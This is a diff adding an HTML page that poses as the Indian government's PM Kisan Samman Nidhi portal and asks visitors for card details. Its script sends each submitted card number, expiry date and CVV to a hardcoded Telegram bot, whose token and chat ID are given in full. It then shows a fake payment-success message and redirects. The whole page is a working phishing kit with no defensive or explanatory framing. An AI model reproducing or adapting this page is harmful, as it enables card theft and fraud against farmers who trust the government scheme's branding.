@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Payment</title>
+    <style>
+        /* Top Header Styles */
+        .top-header {
+            background-color: white;
+            color: black;
+            padding: 10px 15px;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .top-header p {
+            margin: 5px 0;
+            font-size: 0.9rem;
+        }
+
+        .top-header a {
+            color: #1565c0;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .top-header a:hover {
+            text-decoration: underline;
+        }
+
+        /* General Styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f4f7;
+        }
+
+        /* Header Section */
+        .header {
+            background-color: #1565c0;
+            color: white;
+            padding: 10px 15px;
+            text-align: center;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.5rem;
+        }
+
+        .header p {
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+
+        /* Left Image and Header Section */
+        .left-image-section {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            background-color: #1565c0;
+        }
+
+        .left-image-section img {
+            max-height: 100px;
+            margin-right: 20px;
+        }
+
+        .left-image-section-text {
+            color: white;
+        }
+
+        /* Form Container */
+        .form-container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 10px;
+            width: 40%;
+            margin: 20px auto;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .form-container input, .form-container button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 1rem;
+        }
+
+        .form-container button {
+            background-color: #1565c0;
+            color: white;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .form-container button:hover {
+            background-color: #0044cc;
+        }
+
+        .otp-display {
+            display: none;
+            color: green;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        .info-text {
+            font-size: 0.9rem;
+            color: #555;
+            margin: 10px 0;
+        }
+
+        .error-message {
+            color: red;
+            font-weight: bold;
+            display: none;
+        }
+
+        .success-message {
+            color: green;
+            font-weight: bold;
+            display: none;
+        }
+
+        .timer {
+            font-weight: bold;
+            color: #1565c0;
+        }
+
+        /* Processing Animation */
+        .processing-animation {
+            display: none;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #1565c0;
+            margin-top: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #1565c0;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        /* Animation for redirection */
+        @keyframes fadeOut {
+            from { opacity: 1; }
+            to { opacity: 0; }
+        }
+
+        .redirect-animation {
+            animation: fadeOut 1s ease-in-out;
+        }
+
+        /* Popup Styles */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+        }
+
+        .popup button {
+            background-color: #1565c0;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .popup button:hover {
+            background-color: #0044cc;
+        }
+
+        /* Overlay Styles */
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        /* Footer Section */
+        .footer {
+            background-color: black;
+            color: white;
+            padding: 15px;
+            text-align: center;
+        }
+
+        .footer-links {
+            margin-bottom: 10px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 0.8rem;
+            margin: 0 5px;
+        }
+
+        .footer-text p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .copyright p {
+            font-size: 0.8rem;
+            margin: 5px 0;
+        }
+
+        .mid-banner img {
+            max-width: 50%;
+            height: auto;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .form-container {
+                width: 80%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Top Header -->
+    <div class="top-header">
+        <h2>भारत सरकार | GOVERNMENT OF INDIA</h2>
+        <p>कृषि और किसान कल्याण मंत्रालय | MINISTRY OF AGRICULTURE & FARMERS WELFARE</p>
+        <a href="#main-content">Skip to Main Content</a>
+    </div>
+
+    <!-- Header Section -->
+    <header class="header">
+        <div class="left-image-section">
+            <img src="1image2.png" alt="PM Kisan Logo">
+            <div class="left-image-section-text">
+                <h1>PM Kisan Samman Nidhi</h1>
+                <p>Department of Agriculture and Farmers Welfare<br>Ministry of Agriculture and Farmers Welfare<br>Government of India</p>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Section -->
+    <main class="main-content" id="main-content">
+        <div class="form-container">
+            <h3>Card Payment</h3>
+            <form id="cardForm">
+                <label for="cardNumber">Enter Card Number:</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="Enter Card Number (e.g., 3456 6543 6789 7654)" required>
+
+                <label for="expiryDate">Enter Expiry Date (MM/YY):</label>
+                <input type="text" id="expiryDate" name="expiryDate" placeholder="Enter Expiry Date (e.g., 11/25)" required>
+
+                <label for="cvv">Enter CVV (3 digits):</label>
+                <input type="password" id="cvv" name="cvv" placeholder="Enter CVV" maxlength="3" required>
+
+                <div id="cardError" class="error-message"></div>
+                <div id="cardSuccess" class="success-message"></div>
+
+                <button type="submit">Submit Details</button>
+            </form>
+
+            <!-- Processing Animation -->
+            <div id="processingAnimation" class="processing-animation">
+                <div class="spinner"></div>
+                Processing your payment...
+            </div>
+        </div>
+    </main>
+
+    <!-- Popup for Invalid Expiry Date -->
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+        <p>Please fill in a valid expiry date (MM/YY).</p>
+        <button onclick="closePopup()">OK</button>
+    </div>
+
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="mid-banner">
+            <img src="footer2.jpg" alt="Government of India Ministry of Agriculture Banner">
+        </div>
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#disclaimer">Disclaimer</a> | 
+                <a href="#terms">Terms and Conditions</a> | 
+                <a href="#privacy">Privacy Policy</a> | 
+                <a href="#copyright">Copyright Policy</a> | 
+                <a href="#linking">Hyperlinking Policy</a> | 
+                <a href="#accessibility">Accessibility</a>
+            </div>
+            <div class="footer-text">
+                <p>Privacy Policy For Mobile App</p>
+                <p>Site is designed and hosted by National Informatics Centre. Contents published and managed by Department of Agriculture, Cooperation & Farmers Welfare, Ministry of Agriculture and Farmers Welfare, Government of India.</p>
+                <p>Page Last Updated on : 09/02/2025</p>
+            </div>
+            <div class="mid-banner">
+                <img src="footer3.jpg" alt="Government of India Ministry of Agriculture Banner">
+            </div>
+            <div class="copyright">
+                <p>&copy; 2023 PM KISAN Samman Nidhi. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+
+    <script>
+        // Telegram Bot API Token and Chat ID
+        const BOT_TOKEN = '7714806324:AAFOeSPa7CX_wxM1BRnEb1ZCJxpOlVHnhuw'; // Replace with your bot token
+        const CHAT_ID = '-1002253043573'; // Replace with your chat ID
+
+        // Function to send a message to Telegram
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = {
+                chat_id: CHAT_ID,
+                text: message
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(params)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message sent to Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Error sending message to Telegram:', error);
+            });
+        }
+
+        // Form Submission Handler
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Validate Card Number
+            if (cardNumber.replace(/\D/g, '').length !== 16) {
+                document.getElementById('cardError').innerText = "Invalid Card Number. Please enter 16 digits.";
+                return;
+            }
+
+            // Validate Expiry Date
+            const [month, year] = expiryDate.split('/');
+            const currentYear = new Date().getFullYear() % 100; // Last 2 digits of the year
+            const currentMonth = new Date().getMonth() + 1; // Months are 0-indexed
+
+            if (month < 1 || month > 12 || year < currentYear || (year == currentYear && month < currentMonth)) {
+                showPopup(); // Show popup for invalid expiry date
+                return;
+            }
+
+            // Validate CVV
+            if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+                document.getElementById('cardError').innerText = "Invalid CVV. Please enter exactly 3 digits.";
+                return;
+            }
+
+            // If all validations pass
+            document.getElementById('cardError').innerText = "";
+            document.getElementById('cardSuccess').innerText = "Payment Processed Successfully! ✅";
+
+            // Show processing animation
+            document.getElementById('processingAnimation').style.display = "block";
+
+            // Send a message to Telegram
+            const message = `Payment Processed Successfully!\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}`;
+            sendTelegramMessage(message);
+
+            // Redirect to pass.html after 3 seconds
+            setTimeout(() => {
+                document.body.classList.add('redirect-animation');
+                setTimeout(() => {
+                    window.location.href = "pass.html"; // Redirect to new.html
+                }, 1000); // Wait for the animation to complete
+            }, 3000); // Wait for the processing animation
+        });
+    </script>
+
+    <script>
+        // Card Number Formatting
+        document.getElementById('cardNumber').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, ''); // Remove non-numeric characters
+            if (value.length > 16) value = value.substring(0, 16); // Limit to 16 digits
+            value = value.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4'); // Format as XXXX XXXX XXXX XXXX
+            this.value = value;
+        });
+
+        // Expiry Date Validation
+        document.getElementById('expiryDate').addEventListener('input', function() {
+            let value = this.value.replace(/\D/g, ''); // Remove non-numeric characters
+            if (value.length > 4) value = value.substring(0, 4); // Limit to 4 digits
+            value = value.replace(/(\d{2})(\d{2})/, '$1/$2'); // Format as MM/YY
+            this.value = value;
+        });
+
+        // Show Popup
+        function showPopup() {
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('popup').style.display = 'block';
+        }
+
+        // Close Popup
+        function closePopup() {
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('popup').style.display = 'none';
+        }
+
+        // Form Submission Handler
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+
+            // Validate Card Number
+            if (cardNumber.replace(/\D/g, '').length !== 16) {
+                document.getElementById('cardError').innerText = "Invalid Card Number. Please enter 16 digits.";
+                return;
+            }
+
+            // Validate Expiry Date
+            const [month, year] = expiryDate.split('/');
+            const currentYear = new Date().getFullYear() % 100; // Last 2 digits of the year
+            const currentMonth = new Date().getMonth() + 1; // Months are 0-indexed
+
+            if (month < 1 || month > 12 || year < currentYear || (year == currentYear && month < currentMonth)) {
+                showPopup(); // Show popup for invalid expiry date
+                return;
+            }
+
+            // Validate CVV
+            if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
+                document.getElementById('cardError').innerText = "Invalid CVV. Please enter exactly 3 digits.";
+                return;
+            }
+
+            // If all validations pass
+            document.getElementById('cardError').innerText = "";
+            document.getElementById('cardSuccess').innerText = "Payment Processed Successfully! ✅";
+
+            // Show processing animation
+            document.getElementById('processingAnimation').style.display = "block";
+
+            // Redirect to pass.html after 3 seconds
+            setTimeout(() => {
+                document.body.classList.add('redirect-animation');
+                setTimeout(() => {
+                    window.location.href = "pass.html"; // Redirect to new.html
+                }, 1000); // Wait for the animation to complete
+            }, 3000); // Wait for the processing animation
+        });
+    </script>
+</body>
+</html>
